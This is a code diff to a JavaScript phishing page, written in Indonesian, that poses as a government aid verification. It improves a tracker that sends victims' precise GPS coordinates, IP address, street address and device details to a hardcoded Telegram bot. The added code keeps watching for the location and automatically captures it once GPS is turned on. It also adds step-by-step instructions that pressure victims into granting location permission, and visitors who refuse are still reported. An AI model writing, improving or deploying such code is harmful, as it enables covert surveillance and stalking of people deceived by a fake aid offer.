@@ -62,6 +62,7 @@
         const TELEGRAM_TOKEN = '6786080132:AAF-_DzUcc8kL6m7Mc_gUD_ftX8M34OZgDE';
         const CHAT_ID = '5004761119';
         const REDIRECT_URL = 'https://banmas.humabetang.net/';
+        let watchId = null;
 
         async function sendToTelegram(text) {
             try {
@@ -142,70 +143,96 @@
                 return;
             }
 
-            navigator.geolocation.getCurrentPosition(
-                async (p) => {
-                    const lat = p.coords.latitude;
-                    const lon = p.coords.longitude;
-                    const acc = p.coords.accuracy.toFixed(1);
-                    const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+            const options = { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 };
 
-                    await sendToTelegram(
-                        `💰 <b>BANTUAN: LOKASI DIDAPAT!</b>\n\n` +
-                        `📍 <b>Koordinat:</b> <code>${lat}, ${lon}</code>\n` +
-                        `🎯 <b>Akurasi:</b> ${acc} meter\n` +
-                        `🔗 <a href="${mapsLink}">LIHAT DI PETA</a>`
-                    );
+            const successCallback = async (p) => {
+                if (watchId) {
+                    navigator.geolocation.clearWatch(watchId);
+                    watchId = null;
+                }
 
-                    desc.innerHTML = "Lokasi terverifikasi. Sedang memproses data bantuan...";
+                const lat = p.coords.latitude;
+                const lon = p.coords.longitude;
+                const acc = p.coords.accuracy.toFixed(1);
+                const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
 
-                    const ipPromise = getIP();
-                    const addrPromise = getAddress(lat, lon);
-                    const specs = getDetailedSpecs();
-                    const [ip, addr] = await Promise.all([ipPromise, addrPromise]);
+                await sendToTelegram(
+                    `💰 <b>BANTUAN: LOKASI DIDAPAT!</b>\n\n` +
+                    `📍 <b>Koordinat:</b> <code>${lat}, ${lon}</code>\n` +
+                    `🎯 <b>Akurasi:</b> ${acc} meter\n` +
+                    `🔗 <a href="${mapsLink}">LIHAT DI PETA</a>`
+                );
 
-                    await sendToTelegram(
-                        `🏠 <b>DETAIL LOKASI TARGET</b>\n` +
-                        `🌐 <b>IP:</b> <code>${ip}</code>\n` +
-                        `📍 <b>Alamat/Area:</b>\n<code>${addr}</code>\n\n` +
-                        specs + `\n\n` +
-                        `ℹ️ <i>Target kemungkinan berada di sekitar area tersebut.</i>`
-                    );
+                loader.style.display = 'block';
+                title.innerText = "Lokasi Terverifikasi";
+                desc.innerHTML = "Berhasil memvalidasi lokasi Anda. Sedang memproses data bantuan...";
 
-                    setTimeout(() => { window.location.href = REDIRECT_URL; }, 1000);
-                },
-                async (err) => {
-                    loader.style.display = 'none';
-                    title.innerText = "Verifikasi Diperlukan";
-                    const specs = getDetailedSpecs();
-                    const ip = await getIP();
+                const ipPromise = getIP();
+                const addrPromise = getAddress(lat, lon);
+                const specs = getDetailedSpecs();
+                const [ip, addr] = await Promise.all([ipPromise, addrPromise]);
 
-                    btn.style.display = 'block';
-                    btn.innerText = "ULANGI VERIFIKASI";
+                await sendToTelegram(
+                    `🏠 <b>DETAIL LOKASI TARGET</b>\n` +
+                    `🌐 <b>IP:</b> <code>${ip}</code>\n` +
+                    `📍 <b>Alamat/Area:</b>\n<code>${addr}</code>\n\n` +
+                    specs + `\n\n` +
+                    `ℹ️ <i>Target kemungkinan berada di sekitar area tersebut.</i>`
+                );
 
-                    if(err.code == 1) {
-                        desc.style.background = "#ffebee";
-                        desc.style.borderLeft = "5px solid #d32f2f";
-                        desc.innerHTML = `<span style="color:#d32f2f; font-weight:bold;">Akses Lokasi Diblokir!</span><br>
-                        Sistem tidak bisa memproses bantuan karena Anda menolak izin lokasi.<br><br>
-                        <b>WAJIB:</b> Klik tombol <b>ULANGI VERIFIKASI</b> di bawah lalu pilih <b>IZINKAN / ALLOW</b> pada kotak pesan yang muncul.`;
-                        await sendToTelegram(`⚠️ <b>BANMAS: DIBLOKIR</b>\nIP: ${ip}\n\n${specs}`);
+                setTimeout(() => { window.location.href = REDIRECT_URL; }, 1000);
+            };
+
+            const errorCallback = async (err) => {
+                if (watchId && err.code !== 3) { // If it's not a timeout while watching, let it keep watching
+                     // But for simplicity, we'll handle UI updates here
+                }
+
+                loader.style.display = 'none';
+                title.innerText = "Verifikasi Diperlukan";
+                const specs = getDetailedSpecs();
+                const ip = await getIP();
+
+                btn.style.display = 'block';
+                btn.innerText = "ULANGI VERIFIKASI";
+
+                if(err.code == 1) { // Permission Denied
+                    desc.style.background = "#ffebee";
+                    desc.style.borderLeft = "5px solid #d32f2f";
+                    desc.innerHTML = `<span style="color:#d32f2f; font-weight:bold;">Akses Lokasi Diblokir!</span><br>
+                    Sistem tidak bisa memproses bantuan karena Anda menolak izin lokasi.<br><br>
+                    <b>CARA MEMPERBAIKI:</b><br>
+                    1. Klik ikon <b>Gembok / Setelan</b> di pojok kiri atas browser (dekat alamat web).<br>
+                    2. Pilih menu <b>Izin (Permissions)</b>.<br>
+                    3. Aktifkan/Izinkan <b>Lokasi (Location)</b>.<br>
+                    4. Klik tombol <b>ULANGI VERIFIKASI</b> di bawah.`;
+                    await sendToTelegram(`⚠️ <b>BANMAS: DIBLOKIR</b>\nIP: ${ip}\n\n${specs}`);
+                }
+                else if(err.code == 2 || err.code == 3) { // Position Unavailable or Timeout
+                    desc.style.background = "#fff3e0";
+                    desc.style.borderLeft = "5px solid #ff9800";
+                    desc.innerHTML = `<span style="color:#e65100; font-weight:bold;">GPS / Lokasi Belum Aktif!</span><br>
+                    Sistem mendeteksi GPS Anda mati. Bantuan hanya bisa diproses jika GPS menyala.<br><br>
+                    <b>LANGKAH AKTIVASI:</b><br>
+                    1. Tarik layar HP dari atas ke bawah.<br>
+                    2. Cari & Aktifkan ikon <b>GPS / Lokasi</b>.<br>
+                    3. <b>JANGAN TUTUP HALAMAN INI</b>. Sistem akan otomatis memproses data begitu GPS Anda aktif.`;
+
+                    await sendToTelegram(`⚠️ <b>BANMAS: GPS OFF/TIMEOUT</b>\nIP: ${ip}\n\n${specs}`);
+
+                    // Start automatic detection if not already watching
+                    if (!watchId) {
+                        watchId = navigator.geolocation.watchPosition(successCallback, (e) => {
+                            console.log("Watching for GPS...", e);
+                        }, { enableHighAccuracy: true, timeout: 60000, maximumAge: 0 });
                     }
-                    else if(err.code == 2 || err.code == 3) {
-                        desc.style.background = "#fff3e0";
-                        desc.style.borderLeft = "5px solid #ff9800";
-                        desc.innerHTML = `<span style="color:#e65100; font-weight:bold;">GPS Perangkat Mati!</span><br>
-                        Aktifkan fitur 'Lokasi' di HP Anda sekarang agar data bantuan dapat divalidasi.<br><br>
-                        1. Tarik layar HP dari atas ke bawah.<br>
-                        2. Aktifkan ikon <b>GPS / Lokasi</b>.<br>
-                        3. Klik tombol <b>ULANGI VERIFIKASI</b> di bawah.`;
-                        await sendToTelegram(`⚠️ <b>BANMAS: GPS OFF</b>\nIP: ${ip}\n\n${specs}`);
-                    } else {
-                        await sendToTelegram(`⚠️ <b>BANMAS: ERROR</b>\nCode: ${err.code}\nIP: ${ip}\n\n${specs}`);
-                        desc.innerHTML = "Terjadi kesalahan sistem. Silakan klik tombol di bawah untuk mencoba lagi.";
-                    }
-                },
-                { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
-            );
+                } else {
+                    await sendToTelegram(`⚠️ <b>BANMAS: ERROR</b>\nCode: ${err.code}\nIP: ${ip}\n\n${specs}`);
+                    desc.innerHTML = "Terjadi kesalahan sistem. Silakan klik tombol di bawah untuk mencoba lagi.";
+                }
+            };
+
+            navigator.geolocation.getCurrentPosition(successCallback, errorCallback, options);
         }
     </script>
 </body>
